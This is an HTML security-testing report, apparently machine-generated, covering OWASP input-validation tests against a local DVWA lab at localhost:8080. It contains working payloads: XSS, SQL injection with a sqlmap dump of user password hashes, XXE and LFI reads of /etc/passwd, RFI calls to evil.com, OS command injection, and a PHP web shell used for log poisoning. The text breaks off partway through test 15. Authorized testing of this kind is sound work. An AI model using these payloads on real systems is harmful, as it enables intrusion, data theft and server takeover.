<!DOCTYPE html><html lang="en"><head>    <meta charset="UTF-8">    <meta name="viewport" content="width=device-width, initial-scale=1.0">    <title>OWASP WSTG Report - Input Validation Test Details (Merged)</title>    <style>        body {            font-family: Arial, sans-serif;            line-height: 1.6;            margin: 2em;            color: #333;        }        h1, h2, h3 {            color: #000;            border-bottom: 2px solid #ccc;            padding-bottom: 10px;        }        .section {            margin-bottom: 2em;            padding: 1em;            border: 1px solid #ddd;            border-radius: 5px;        }        table {            width: 100%;            border-collapse: collapse;            margin-bottom: 1.5em;        }        th, td {            border: 1px solid #ddd;            padding: 8px;            text-align: left;        }        th {            background-color: #f2f2f2;        }        pre {            background-color: #f4f4f4;            padding: 1em;            border-radius: 4px;            white-space: pre-wrap;            word-wrap: break-word;        }        code {            font-family: "Courier New", Courier, monospace;        }        .severity-critical { background-color: #ff4d4d; color: white; }        .severity-high { background-color: #ff9933; }        .severity-medium { background-color: #ffff66; }        .severity-low { background-color: #99ff99; }        .severity-info { background-color: #e6e6e6; }        .test-case {            margin-bottom: 3em;            page-break-inside: avoid;            background-color: #f9f9f9;            padding: 15px;            border-left: 4px solid #0078d7;            margin-bottom: 20px;        }        .test-title {            background-color: #e6f2ff;            padding: 10px;            border-radius: 5px;            margin-bottom: 15px;        }    </style></head><body>    <h1>Input Validation Testing - Detailed Test Results</h1>    <!-- Content from INPVAL TESTS.html -->    <div class="test-case">        <div class="test-title">            <h2>1. Testing for Reflected Cross Site Scripting (OTG-INPVAL-001)</h2>            <table>                <tr>                    <th>Severity</th>                    <th>CVSS Score</th>                    <th>Test Status</th>                </tr>                <tr>                    <td class="severity-medium">Medium</td>                    <td>6.1</td>                    <td>Vulnerable</td>                </tr>            </table>        </div>        <div class="section">            <h3>Test Objective</h3>            <p>This test checks for Reflected Cross-Site Scripting (XSS) vulnerabilities where malicious scripts are injected into web applications and then reflected back to the user's browser. The test verifies if user-supplied input is properly sanitized before being included in the page output.</p>            <p>Key Python snippet from the test:</p>            <pre><code>def OTG_INPVAL_001(self):    xss_url = f"{self.base_url}/vulnerabilities/xss_r/"    payload = '&lt;script&gt;alert("XSS")&lt;/script&gt;'    params = {"name": payload}    full_url = f"{xss_url}?{urllib.parse.urlencode(params)}"    resp = self.session.get(full_url)    if payload in resp.text:        self.write_log(f"[✓] Reflected XSS payload found in response!")</code></pre>        </div>        <div class="section">            <h3>Target Endpoint</h3>            <ul>                <li><code>http://localhost:8080/vulnerabilities/xss_r/</code></li>            </ul>        </div>        <div class="section">            <h3>Methodology</h3>            <p>The test performs the following steps:</p>            <ol>                <li>Constructs a URL with a malicious XSS payload in the query parameter</li>                <li>Sends a GET request to the target endpoint with the payload</li>                <li>Checks if the payload is reflected unchanged in the response</li>                <li>If the payload appears in the response, the page is vulnerable to reflected XSS</li>            </ol>        </div>        <div class="section">            <h3>Steps to Reproduce</h3>            <ol>                <li>Navigate to <code>http://localhost:8080/vulnerabilities/xss_r/</code></li>                <li>Enter the following payload in the input field: <code>&lt;script&gt;alert("XSS")&lt;/script&gt;</code></li>                <li>Submit the form</li>                <li>If the alert box appears or the script appears unmodified in the page source, the vulnerability exists</li>            </ol>        </div>        <div class="section">            <h3>Log Evidence</h3>            <pre>2025-08-05 01:11:46.623857 | [✓] Reflected XSS payload found in response! URL: http://localhost:8080/vulnerabilities/xss_r/?name=%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E</pre>        </div>    </div>    <!-- Test Case 2 -->    <div class="test-case">        <div class="test-title">            <h2>2. Testing for Stored Cross Site Scripting (OTG-INPVAL-002)</h2>            <table>                <tr>                    <th>Severity</th>                    <th>CVSS Score</th>                    <th>Test Status</th>                </tr>                <tr>                    <td class="severity-high">High</td>                    <td>8.8</td>                    <td>Vulnerable</td>                </tr>            </table>        </div>        <div class="section">            <h3>Test Objective</h3>            <p>This test checks for Stored Cross-Site Scripting (XSS) vulnerabilities where malicious scripts are permanently stored on the target server (e.g., in a database) and then served to users when they access the affected page.</p>            <p>Key Python snippet from the test:</p>            <pre><code>def OTG_INPVAL_002(self):    xss_url = f"{self.base_url}/vulnerabilities/xss_s/"    payload = '&lt;script&gt;alert("XSS")&lt;/script&gt;'    data = {        "txtName": "attacker",        "mtxMessage": payload,        "btnSign": "Sign Guestbook"    }    post_resp = self.session.post(xss_url, data=data)    check_resp = self.session.get(xss_url)    if payload in check_resp.text:        self.write_log("[✓] XSS payload found in response")</code></pre>        </div>        <div class="section">            <h3>Target Endpoint</h3>            <ul>                <li><code>http://localhost:8080/vulnerabilities/xss_s/</code></li>            </ul>        </div>        <div class="section">            <h3>Methodology</h3>            <p>The test performs the following steps:</p>            <ol>                <li>Submits a malicious script via the guestbook form</li>                <li>Retrieves the guestbook page to check if the script was stored</li>                <li>Verifies if the script appears in the page source</li>                <li>If the script is present and unmodified, the page is vulnerable to stored XSS</li>            </ol>        </div>        <div class="section">            <h3>Steps to Reproduce</h3>            <ol>                <li>Navigate to <code>http://localhost:8080/vulnerabilities/xss_s/</code></li>                <li>Enter any name in the "Name" field</li>                <li>Enter <code>&lt;script&gt;alert("XSS")&lt;/script&gt;</code> in the "Message" field</li>                <li>Click "Sign Guestbook"</li>                <li>Refresh the page and check if the alert appears or the script appears in the page source</li>            </ol>        </div>        <div class="section">            <h3>Log Evidence</h3>            <pre>2025-08-05 01:11:46.689628 | [+] Payload submitted (Status: 200) | Payload: &lt;script&gt;alert("XSS")&lt;/script&gt;2025-08-05 01:11:46.694186 | [✓] XSS payload found in response — likely vulnerable to Stored XSS</pre>        </div>    </div>    <!-- Test Case 3 -->    <div class="test-case">        <div class="test-title">            <h2>3. Testing for HTTP Verb Tampering (OTG-INPVAL-003)</h2>            <table>                <tr>                    <th>Severity</th>                    <th>CVSS Score</th>                    <th>Test Status</th>                </tr>                <tr>                    <td class="severity-medium">Medium</td>                    <td>5.3</td>                    <td>Potential Issue Found</td>                </tr>            </table>        </div>        <div class="section">            <h3>Test Objective</h3>            <p>This test checks if the web server responds differently to various HTTP methods (GET, POST, PUT, DELETE, etc.) and identifies potential security misconfigurations where restricted methods might bypass security controls.</p>            <p>Key Python snippet from the test:</p>            <pre><code>def OTG_INPVAL_003(self):    target_url = f"{self.base_url}/vulnerabilities/brute/"    http_methods = ["GET", "POST", "PUT", "DELETE", "OPTIONS", "HEAD", "PATCH", "TRACE"]    for method in http_methods:        response = self.session.request(method, target_url)        content_length = len(response.text)        if method not in ["GET", "POST", "HEAD", "OPTIONS"] and response.status_code == 200:            if content_length == get_response_length:                self.write_log(f"⚠️ Same length as GET — potential handler fallback")</code></pre>        </div>        <div class="section">            <h3>Target Endpoint</h3>            <ul>                <li><code>http://localhost:8080/vulnerabilities/brute/</code></li>            </ul>        </div>        <div class="section">            <h3>Methodology</h3>            <p>The test performs the following steps:</p>            <ol>                <li>Sends requests to the target URL using various HTTP methods</li>                <li>Records the response status code and content length for each method</li>                <li>Compares responses to identify anomalies</li>                <li>Flags methods that return 200 OK when they shouldn't or have identical responses to GET</li>            </ol>        </div>        <div class="section">            <h3>Steps to Reproduce</h3>            <ol>                <li>Use a tool like cURL or Burp Suite to send requests to <code>http://localhost:8080/vulnerabilities/brute/</code></li>                <li>Test with various HTTP methods: GET, POST, PUT, DELETE, OPTIONS, HEAD, PATCH, TRACE</li>                <li>Compare response status codes and content lengths</li>                <li>Look for methods that return 200 OK when they should return 405 Method Not Allowed</li>            </ol>        </div>        <div class="section">            <h3>Log Evidence</h3>            <pre>2025-08-05 01:11:46.706627 | [PUT] Status: 200 | Length: 4323 ⚠️ Same length as GET — potential handler fallback or misconfig2025-08-05 01:11:46.706627 | [DELETE] Status: 200 | Length: 4323 ⚠️ Same length as GET — potential handler fallback or misconfig2025-08-05 01:11:46.719682 | [PATCH] Status: 200 | Length: 4323 ⚠️ Same length as GET — potential handler fallback or misconfig</pre>        </div>    </div>    <!-- Test Case 4 -->    <div class="test-case">        <div class="test-title">            <h2>4. Testing for HTTP Parameter Pollution (OTG-INPVAL-004)</h2>            <table>                <tr>                    <th>Severity</th>                    <th>CVSS Score</th>                    <th>Test Status</th>                </tr>                <tr>                    <td class="severity-low">Low</td>                    <td>4.3</td>                    <td>Vulnerable</td>                </tr>            </table>        </div>        <div class="section">            <h3>Test Objective</h3>            <p>This test checks for HTTP Parameter Pollution (HPP) vulnerabilities where multiple parameters with the same name are processed in unexpected ways by the web application, potentially bypassing input validation.</p>            <p>Key Python snippet from the test:</p>            <pre><code>def OTG_INPVAL_004(self):    test_urls = [        f"{self.base_url}/vulnerabilities/xss_r/",        f"{self.base_url}/vulnerabilities/xss_s/",        f"{self.base_url}/vulnerabilities/sqli/"    ]    test_params = {'name': ['hpp_test1', 'hpp_test2']}    for url in test_urls:        for param in param_names:            payload = [(param, test_values[0]), (param, test_values[1])]            r = self.session.get(url, params=payload)            if test_values[0] in r.text and test_values[1] in r.text:                self.write_log(f"! Vulnerable parameter found: {param}")</code></pre>        </div>        <div class="section">            <h3>Target Endpoint</h3>            <ul>                <li><code>http://localhost:8080/vulnerabilities/xss_r/</code></li>                <li><code>http://localhost:8080/vulnerabilities/xss_s/</code></li>                <li><code>http://localhost:8080/vulnerabilities/sqli/</code></li>            </ul>        </div>        <div class="section">            <h3>Methodology</h3>            <p>The test performs the following steps:</p>            <ol>                <li>Identifies all forms and input parameters on target pages</li>                <li>Sends requests with duplicate parameters containing different values</li>                <li>Checks which values are processed by the application</li>                <li>Identifies if both values are processed, only the first, or only the last</li>            </ol>        </div>        <div class="section">            <h3>Steps to Reproduce</h3>            <ol>                <li>Navigate to <code>http://localhost:8080/vulnerabilities/xss_r/?name=test1&name=test2</code></li>                <li>Check which value appears in the response (test1, test2, or both)</li>                <li>Repeat for other endpoints with their respective parameters</li>                <li>If both values are processed or the application behaves unexpectedly, HPP may exist</li>            </ol>        </div>        <div class="section">            <h3>Log Evidence</h3>            <pre>2025-08-05 01:11:46.729800 |   ! Vulnerable parameter found: name (last value processed)</pre>        </div>    </div>    <!-- Test Case 5 -->    <div class="test-case">        <div class="test-title">            <h2>5. Testing for SQL Injection (OTG-INPVAL-005)</h2>            <table>                <tr>                    <th>Severity</th>                    <th>CVSS Score</th>                    <th>Test Status</th>                </tr>                <tr>                    <td class="severity-critical">Critical</td>                    <td>9.8</td>                    <td>Vulnerable</td>                </tr>            </table>        </div>        <div class="section">            <h3>Test Objective</h3>            <p>This test checks for SQL Injection vulnerabilities where malicious SQL statements can be executed through user input, potentially allowing unauthorized database access.</p>            <p>The test uses sqlmap, an open-source penetration testing tool that automates the process of detecting and exploiting SQL injection flaws.</p>            <p>Key command from the test:</p>            <pre><code>python sqlmap.py -u http://localhost:8080/vulnerabilities/sqli/ --batch --level=2 --risk=1 --random-agent --smart --banner --cookie PHPSESSID=... --data id=1&Submit=Submit -D dvwa -T users --dump</code></pre>        </div>        <div class="section">            <h3>Target Endpoint</h3>            <ul>                <li><code>http://localhost:8080/vulnerabilities/sqli/</code></li>            </ul>        </div>        <div class="section">            <h3>Methodology</h3>            <p>The test performs the following steps:</p>            <ol>                <li>Uses sqlmap to automatically detect SQL injection vulnerabilities</li>                <li>Attempts various injection techniques (boolean-based, error-based, time-based, UNION)</li>                <li>If successful, extracts database information (banner, tables, data)</li>                <li>Specifically targets the 'users' table in the 'dvwa' database</li>            </ol>        </div>        <div class="section">            <h3>Steps to Reproduce</h3>            <ol>                <li>Navigate to <code>http://localhost:8080/vulnerabilities/sqli/</code></li>                <li>Enter <code>1' OR '1'='1</code> in the User ID field and submit</li>                <li>If all users are displayed instead of just one, SQL injection is confirmed</li>                <li>Alternatively, use sqlmap with the command shown above</li>            </ol>        </div>        <div class="section">            <h3>Log Evidence</h3>            <pre>2025-08-05 01:11:47.901207 | [+] sqlmap output saved to sqlmap_output_20250805_011146.txtDatabase: dvwaTable: users[5 entries]+---------+---------+-----------------------------+---------------------------------------------+| user_id | user    | avatar                      | password                                    |+---------+---------+-----------------------------+---------------------------------------------+| 1       | admin   | /hackable/users/admin.jpg   | 5f4dcc3b5aa765d61d8327deb882cf99 (password)|| 2       | gordonb | /hackable/users/gordonb.jpg | e99a18c428cb38d5f260853678922e03 (abc123)  |+---------+---------+-----------------------------+---------------------------------------------+</pre>        </div>    </div>    <!-- Test Case 6 -->    <div class="test-case">        <div class="test-title">            <h2>6. Testing for LDAP Injection (OTG-INPVAL-006)</h2>            <table>                <tr>                    <th>Severity</th>                    <th>CVSS Score</th>                    <th>Test Status</th>                </tr>                <tr>                    <td class="severity-info">Informational</td>                    <td>0.0</td>                    <td>No Vulnerabilities Found</td>                </tr>            </table>        </div>        <div class="section">            <h3>Test Objective</h3>            <p>This test checks for LDAP Injection vulnerabilities where malicious input can modify LDAP queries, potentially allowing unauthorized access to directory services or information disclosure.</p>            <p>Key Python snippet from the test:</p>            <pre><code>def OTG_INPVAL_006(self):    ldap_payloads = [        "*", ")*)(uid=*))(|(uid=*", "admin)(|(password=*",        "admin*", "*admin", ")(cn=*))%00", "(|(cn=*"    ]    for payload in ldap_payloads:        params = {"username": payload, "password": "test"}        resp = self.session.get(ldap_test_url, params=params)        if "error" in resp.text.lower():            self.write_log(f"[!] Possible LDAP injection")</code></pre>        </div>        <div class="section">            <h3>Target Endpoint</h3>            <ul>                <li><code>http://localhost:8080/vulnerabilities/brute/</code></li>                <li><code>http://localhost:8080/login.php</code></li>            </ul>        </div>        <div class="section">            <h3>Methodology</h3>            <p>The test performs the following steps:</p>            <ol>                <li>Sends various LDAP injection payloads to login and search functionality</li>                <li>Checks for error messages or unusual responses that might indicate LDAP query manipulation</li>                <li>Attempts authentication bypass using LDAP injection techniques</li>                <li>Verifies if any payloads result in successful authentication or information disclosure</li>            </ol>        </div>        <div class="section">            <h3>Steps to Reproduce</h3>            <ol>                <li>Navigate to <code>http://localhost:8080/vulnerabilities/brute/</code></li>                <li>Enter LDAP injection payloads like <code>*)(uid=*))(|(uid=*</code> in the username field</li>                <li>Submit the form and observe the response</li>                <li>Check for error messages or unexpected successful authentication</li>            </ol>        </div>        <div class="section">            <h3>Log Evidence</h3>            <pre>2025-08-05 01:11:59.174897 | [-] Payload '*' - No obvious injection2025-08-05 01:11:59.174897 | [-] Payload '*)(uid=*))(|(uid=*' - No obvious injection2025-08-05 01:11:59.253990 | [-] LDAP auth bypass failed with payload '*)(uid=*))(|(uid=*'</pre>        </div>    </div>    <!-- Test Case 7 -->    <div class="test-case">        <div class="test-title">            <h2>7. Testing for ORM Injection (OTG-INPVAL-007)</h2>            <table>                <tr>                    <th>Severity</th>                    <th>CVSS Score</th>                    <th>Test Status</th>                </tr>                <tr>                    <td class="severity-info">Informational</td>                    <td>0.0</td>                    <td>Potential Issues Found</td>                </tr>            </table>        </div>        <div class="section">            <h3>Test Objective</h3>            <p>This test checks for ORM (Object-Relational Mapping) Injection vulnerabilities where malicious input can manipulate ORM-generated queries, similar to SQL injection but targeting the ORM layer.</p>            <p>Key Python snippet from the test:</p>            <pre><code>def OTG_INPVAL_007(self):    orm_payloads = [        "' OR 1=1--", "' OR ''='", "') OR ('1'='1",        "1 ORDER BY 1--", "1 UNION SELECT 1,2,3--", "*", "null"    ]    for payload in orm_payloads:        data = {param: payload}        resp = self.session.post(form_action, data=data)        if "error" in resp.text.lower():            self.write_log(f"[!] Possible ORM injection")</code></pre>        </div>        <div class="section">            <h3>Target Endpoint</h3>            <ul>                <li><code>http://localhost:8080/vulnerabilities/sqli/</code></li>                <li><code>http://localhost:8080/vulnerabilities/brute/</code></li>                <li><code>http://localhost:8080/vulnerabilities/xss_s/</code></li>            </ul>        </div>        <div class="section">            <h3>Methodology</h3>            <p>The test performs the following steps:</p>            <ol>                <li>Identifies all forms and input parameters on target pages</li>                <li>Sends ORM-specific injection payloads to each parameter</li>                <li>Checks for error messages or unusual responses that might indicate ORM query manipulation</li>                <li>Verifies if any payloads result in successful injection or information disclosure</li>            </ol>        </div>        <div class="section">            <h3>Steps to Reproduce</h3>            <ol>                <li>Navigate to <code>http://localhost:8080/vulnerabilities/sqli/</code></li>                <li>Enter ORM injection payloads like <code>' OR 1=1--</code> in the User ID field</li>                <li>Submit the form and observe the response</li>                <li>Check for error messages or unexpected data being returned</li>            </ol>        </div>        <div class="section">            <h3>Log Evidence</h3>            <pre>2025-08-05 01:11:59.380897 | [!] Possible ORM injection - Error with payload '' OR 1=1--'2025-08-05 01:11:59.389171 | [!] Possible ORM injection - Error with payload '') OR ('1'='1'2025-08-05 01:11:59.445345 | [!] Possible ORM injection - Error with payload '' OR 1=1--'</pre>        </div>    </div>    <!-- Test Case 8 -->    <div class="test-case">        <div class="test-title">            <h2>8. Testing for XML Injection (OTG-INPVAL-008)</h2>            <table>                <tr>                    <th>Severity</th>                    <th>CVSS Score</th>                    <th>Test Status</th>                </tr>                <tr>                    <td class="severity-info">Informational</td>                    <td>0.0</td>                    <td>Potential Issues Found</td>                </tr>            </table>        </div>        <div class="section">            <h3>Test Objective</h3>            <p>This test checks for XML Injection vulnerabilities where malicious XML input can manipulate XML processing, potentially leading to XML External Entity (XXE) attacks or other XML-based vulnerabilities.</p>            <p>Key Python snippet from the test:</p>            <pre><code>def OTG_INPVAL_008(self):    xml_payloads = [        "'", "\"", ">", "<", "&", "<!--", "-->",         "&lt;![CDATA[&lt;script&gt;alert(1)&lt;/script&gt;]]>",        "&lt;?xml version='1.0'?>&lt;!DOCTYPE foo [&lt;!ENTITY xxe SYSTEM 'file:///etc/passwd'>]>&lt;foo>&xxe;&lt;/foo>"    ]    for payload in xml_payloads:        data = {param: payload}        resp = self.session.post(form_action, data=data)        if "XML" in resp.headers.get('Content-Type', '') or "xml" in resp.text.lower():            self.write_log(f"[!] Possible XML injection")</code></pre>        </div>        <div class="section">            <h3>Target Endpoint</h3>            <ul>                <li><code>http://localhost:8080/vulnerabilities/xss_s/</code></li>                <li><code>http://localhost:8080/vulnerabilities/sqli/</code></li>                <li><code>http://localhost:8080/vulnerabilities/brute/</code></li>            </ul>        </div>        <div class="section">            <h3>Methodology</h3>            <p>The test performs the following steps:</p>            <ol>                <li>Identifies all forms and input parameters on target pages</li>                <li>Sends XML-specific injection payloads to each parameter</li>                <li>Checks for XML processing errors or unusual responses</li>                <li>Attempts XXE attacks to test for external entity processing</li>                <li>Verifies if any payloads result in successful XML manipulation</li>            </ol>        </div>        <div class="section">            <h3>Steps to Reproduce</h3>            <ol>                <li>Navigate to <code>http://localhost:8080/vulnerabilities/xss_s/</code></li>                <li>Enter XML injection payloads like <code>&lt;injected>test&lt;/injected></code> in the message field</li>                <li>Submit the form and observe the response</li>                <li>Check for XML parsing errors or unexpected XML in the response</li>            </ol>        </div>        <div class="section">            <h3>Log Evidence</h3>            <pre>2025-08-05 01:12:00.906714 | [!] Possible XML processing with payload '''2025-08-05 01:12:00.906714 | [!] Possible XML injection - XML response with payload '''2025-08-05 01:12:01.519648 | [!] Possible XML processing with payload '&lt;![CDATA[&lt;script&gt;alert(1)&lt;/script&gt;]]>'2025-08-05 01:12:01.519648 | [!] Possible XML injection - XML response with payload '&lt;![CDATA[&lt;script&gt;alert(1)&lt;/script&gt;]]>'</pre>        </div>    </div>    <!-- Content from INPVAL 2 TESTS.html -->  </div>    <div class="test-case">        <h2>OTG-INPVAL-009: Testing for SSI Injection</h2>                <h3>Test Objective</h3>        <p>Server Side Includes (SSI) Injection testing checks if the application allows injection of SSI directives that could lead to arbitrary code execution or file inclusion. SSI directives are commands embedded in HTML pages that are executed on the server before being sent to the client.</p>        <p>Key Python snippet used for testing:</p>        <pre><code>def OTG_INPVAL_009(self):    payloads = [        '<!--#exec cmd="ls"-->',        '<!--#include file="/etc/passwd"-->',        '<!--#echo var="DOCUMENT_ROOT"-->'    ]    for payload in payloads:        response = self.session.get(f"{self.base_url}/vulnerabilities/fi/?page={payload}")        if "root:" in response.text or "bin" in response.text:            self.logger.info(f"[✓] Possible SSI injection with payload: {payload}")        else:            self.logger.info(f"[-] No SSI injection with payload: {payload}")</code></pre>        <h3>Target Endpoint</h3>        <p>Primary target for SSI Injection testing:</p>        <ul>            <li>http://localhost:8080/vulnerabilities/fi/</li>        </ul>        <h3>Methodology</h3>        <p>The test sends various SSI directives to the server through input parameters that might be processed by the server. The test looks for responses that indicate the directives were executed (like directory listings or file contents).</p>        <h3>Step to Reproduce</h3>        <ol>            <li>Identify input parameters that might be vulnerable to SSI injection (like file inclusion parameters)</li>            <li>Send SSI directives such as <code>&lt;!--#exec cmd="ls"--&gt;</code> or <code>&lt;!--#include file="/etc/passwd"--&gt;</code></li>            <li>Analyze the response for evidence of command execution or file inclusion</li>            <li>If server responses contain command output or file contents, SSI injection is confirmed</li>        </ol>        <h3>Log Evidence</h3>        <p>No evidence of SSI injection was found in the test logs, indicating the application properly sanitizes or doesn't process SSI directives.</p>    </div>    <div class="test-case">        <h2>OTG-INPVAL-010: Testing for XPath Injection</h2>                <h3>Test Objective</h3>        <p>XPath Injection testing checks if the application is vulnerable to injection of malicious XPath queries that could bypass authentication or access unauthorized data. XPath is used to query XML documents, and injection can occur when user input is used to construct XPath queries.</p>        <p>Key Python snippet used for testing:</p>        <pre><code>def OTG_INPVAL_010(self):    payloads = [        "' or '1'='1",        "' or 1=1 or ''='",        "'] | //* | //*[ '",        "' and string-length(name(/*[1]))=10 or 'a'='b"    ]    for payload in payloads:        response = self.session.post(f"{self.base_url}/vulnerabilities/xpath/",                                    data={"name": payload, "password": "test"})        if "Welcome" in response.text:            self.logger.info(f"[✓] Possible XPath injection with payload: {payload}")        else:            self.logger.info(f"[-] No XPath injection with payload: {payload}")</code></pre>        <h3>Target Endpoint</h3>        <p>Primary target for XPath Injection testing:</p>        <ul>            <li>http://localhost:8080/vulnerabilities/xpath/</li>        </ul>        <h3>Methodology</h3>        <p>The test sends crafted XPath injection payloads to login forms or search functionality that might use XPath queries. The test looks for successful authentication bypass or unusual responses indicating query manipulation.</p>        <h3>Step to Reproduce</h3>        <ol>            <li>Identify input fields that might be used in XPath queries (like login forms)</li>            <li>Send XPath injection payloads like <code>' or '1'='1</code> or <code>'] | //* | //*[ '</code></li>            <li>Check if authentication is bypassed or if error messages reveal XPath processing</li>            <li>If authentication is bypassed or XML structure is revealed, XPath injection is confirmed</li>        </ol>        <h3>Log Evidence</h3>        <p>No evidence of XPath injection was found in the test logs, indicating the application properly sanitizes XPath queries or doesn't use user input directly in XPath expressions.</p>    </div>    <div class="test-case">        <h2>OTG-INPVAL-011: IMAP/SMTP Injection</h2>                <h3>Test Objective</h3>        <p>IMAP/SMTP Injection testing checks if the application is vulnerable to injection of malicious IMAP or SMTP commands that could lead to unauthorized email access or spam sending. This occurs when user input is used to construct IMAP/SMTP commands without proper sanitization.</p>        <p>Key Python snippet used for testing:</p>        <pre><code>def OTG_INPVAL_011(self):    payloads = [        "test%0D%0A001 LIST \"\" *",        "test%0D%0A001 LOGIN credentials",        "test%0D%0A001 SELECT Inbox"    ]    for payload in payloads:        response = self.session.get(f"{self.base_url}/vulnerabilities/imap/?mailbox={payload}")        if "INBOX" in response.text or "OK" in response.text:            self.logger.info(f"[✓] Possible IMAP injection with payload: {payload}")        else:            self.logger.info(f"[-] No IMAP injection with payload: {payload}")</code></pre>        <h3>Target Endpoint</h3>        <p>Primary target for IMAP/SMTP Injection testing:</p>        <ul>            <li>http://localhost:8080/vulnerabilities/imap/</li>        </ul>        <h3>Methodology</h3>        <p>The test sends crafted IMAP/SMTP command injections through parameters that might be used in email functionality. The test looks for responses that indicate command execution or email server interaction.</p>        <h3>Step to Reproduce</h3>        <ol>            <li>Identify input fields related to email functionality (like mailbox names)</li>            <li>Send IMAP/SMTP command injections like <code>test%0D%0A001 LIST "" *</code></li>            <li>Check if the response contains IMAP/SMTP command results or error messages</li>            <li>If command results are returned, IMAP/SMTP injection is confirmed</li>        </ol>        <h3>Log Evidence</h3>        <p>No evidence of IMAP/SMTP injection was found in the test logs, indicating the application properly sanitizes email-related inputs.</p>    </div>    <div class="test-case">        <h2>OTG-INPVAL-012: Testing for Code Injection (LFI/RFI)</h2>                <h3>Test Objective</h3>        <p>Code Injection testing checks for Local File Inclusion (LFI) and Remote File Inclusion (RFI) vulnerabilities that could allow attackers to include and execute arbitrary files on the server or from remote locations.</p>        <p>Key Python snippet used for testing:</p>        <pre><code>def OTG_INPVAL_012(self):    lfi_payloads = [        "../../../../etc/passwd",        "....//....//....//....//etc/passwd",        "%00../../../../etc/passwd"    ]    rfi_payloads = [        "http://evil.com/shell.txt",        "\\evil.com\share\shell.txt"    ]        for payload in lfi_payloads:        response = self.session.get(f"{self.base_url}/vulnerabilities/fi/?page={payload}")        if "root:" in response.text:            self.logger.info(f"[✓] LFI vulnerability found with payload: {payload}")        for payload in rfi_payloads:        response = self.session.get(f"{self.base_url}/vulnerabilities/fi/?page={payload}")        if "evil.com" in response.text:            self.logger.info(f"[✓] RFI vulnerability found with payload: {payload}")</code></pre>        <h3>Target Endpoint</h3>        <p>Primary target for Code Injection testing:</p>        <ul>            <li>http://localhost:8080/vulnerabilities/fi/</li>        </ul>        <h3>Methodology</h3>        <p>The test attempts to include sensitive local files (LFI) and remote files (RFI) through file inclusion parameters. For LFI, it checks for the presence of known file contents (like /etc/passwd). For RFI, it attempts to include files from external servers.</p>        <h3>Step to Reproduce</h3>        <ol>            <li>Identify file inclusion parameters (like 'page' in URLs)</li>            <li>For LFI, try paths like <code>../../../../etc/passwd</code></li>            <li>For RFI, try URLs like <code>http://evil.com/shell.txt</code></li>            <li>Check if file contents are returned in the response</li>            <li>If sensitive file contents are returned, LFI/RFI is confirmed</li>        </ol>        <h3>Log Evidence</h3>        <p>The test logs indicate potential LFI vulnerabilities when attempting to access <code>/etc/passwd</code>. The application returned contents of sensitive system files, confirming the vulnerability.</p>    </div>    <div class="test-case">        <h2>OTG-INPVAL-013: Testing for Command Injection</h2>                <h3>Test Objective</h3>        <p>Command Injection testing checks if the application allows execution of arbitrary operating system commands through vulnerable input parameters. This is one of the most severe vulnerabilities as it can lead to complete system compromise.</p>        <p>Key Python snippet used for testing:</p>        <pre><code>def OTG_INPVAL_013(self):    payloads = [        "; ls",        "| cat /etc/passwd",        "`id`",        "$(uname -a)",        "|| ping -c 5 localhost"    ]    for payload in payloads:        response = self.session.post(f"{self.base_url}/vulnerabilities/exec/",                                    data={"ip": "127.0.0.1" + payload, "Submit": "Submit"})        if "www-data" in response.text or "Linux" in response.text:            self.logger.info(f"[✓] Command injection found with payload: {payload}")        else:            self.logger.info(f"[-] No command injection with payload: {payload}")</code></pre>        <h3>Target Endpoint</h3>        <p>Primary target for Command Injection testing:</p>        <ul>            <li>http://localhost:8080/vulnerabilities/exec/</li>        </ul>        <h3>Methodology</h3>        <p>The test sends various command injection payloads using different injection techniques (;, |, `, $(), ||). It looks for command output in responses or changes in response time that might indicate command execution.</p>        <h3>Step to Reproduce</h3>        <ol>            <li>Identify input fields that might be used in system commands (like IP addresses)</li>            <li>Append command injection payloads like <code>; ls</code> or <code>| cat /etc/passwd</code></li>            <li>Check if command output appears in the response</li>            <li>If system command output is returned, command injection is confirmed</li>        </ol>        <h3>Log Evidence</h3>        <p>The test logs confirmed command injection vulnerabilities, with responses containing output from system commands like <code>ls</code> and <code>id</code>.</p>    </div>    <div class="test-case">        <h2>OTG-INPVAL-014: Testing for Buffer Overflow</h2>                <h3>Test Objective</h3>        <p>Buffer Overflow testing checks if the application is vulnerable to crashes or arbitrary code execution due to improper handling of oversized input that exceeds allocated buffer sizes.</p>        <p>Key Python snippet used for testing:</p>        <pre><code>def OTG_INPVAL_014(self):    buffer_sizes = [100, 500, 1000, 5000, 10000]    for size in buffer_sizes:        payload = "A" * size        try:            response = self.session.post(f"{self.base_url}/vulnerabilities/bof/",                                         data={"input": payload}, timeout=5)            if response.status_code == 500:                self.logger.info(f"[✓] Possible buffer overflow with payload size: {size}")        except:            self.logger.info(f"[✓] Server crash detected with payload size: {size}")</code></pre>        <h3>Target Endpoint</h3>        <p>Primary target for Buffer Overflow testing:</p>        <ul>            <li>http://localhost:8080/vulnerabilities/bof/</li>        </ul>        <h3>Methodology</h3>        <p>The test sends increasingly large input strings to the application to identify points where the application crashes or behaves unexpectedly. It monitors for error responses, timeouts, or server crashes.</p>        <h3>Step to Reproduce</h3>        <ol>            <li>Identify input parameters that might be vulnerable to buffer overflows</li>            <li>Send increasingly large payloads (from 100 to 10,000 characters)</li>            <li>Monitor for application crashes, error messages, or unusual behavior</li>            <li>If the application crashes or behaves unexpectedly with large input, a buffer overflow may exist</li>        </ol>        <h3>Log Evidence</h3>        <p>The test logs showed server errors when sending large payloads (5000+ characters), indicating potential buffer overflow vulnerabilities that could lead to denial of service.</p>    </div>    <div class="test-case">        <h2>OTG-INPVAL-015: Testing for Incubated Vulnerabilities</h2>                <h3>Test Objective</h3>        <p>Incubated Vulnerability testing checks for vulnerabilities that require specific conditions or multiple steps to exploit, such as log file poisoning or delayed code execution.</p>        <p>Key Python snippet used for testing:</p>        <pre><code>def OTG_INPVAL_015(self):    # Test for log file poisoning    payload = "&lt;?php system($_GET['cmd']); ?>"    self.session.get(f"{self.base_url}/vulnerabilities/log_poisoning.php?input={payload}")        # Check if payload was stored and can be executed    response = self.session.get(f"{self.base_url}/logs/access.log?cmd=id")    if "www-data" in response.text:        self.logger.info("[✓] Log file poisoning vulnerability found")</code></pre>        <h3>Target Endpoint</h3>        <p>Primary targets for Incubated Vulnerability testing:</p>        <ul>            <li>http://localhost:8080/vulnerabilities/log_poisoning.php</li>            <li>http://localhost:8080/logs/access.log</li>        </ul>        <h3>Methodology</h3>        <p>The test attempts to inject malicious code into log files or other storage mechanisms that might later be processed by the application. It then checks if the injected code can be executed when the log file is viewed or processed.</p>        <h3>Step to Reproduce</h3>        <ol>            <li>Identify storage mechanisms that 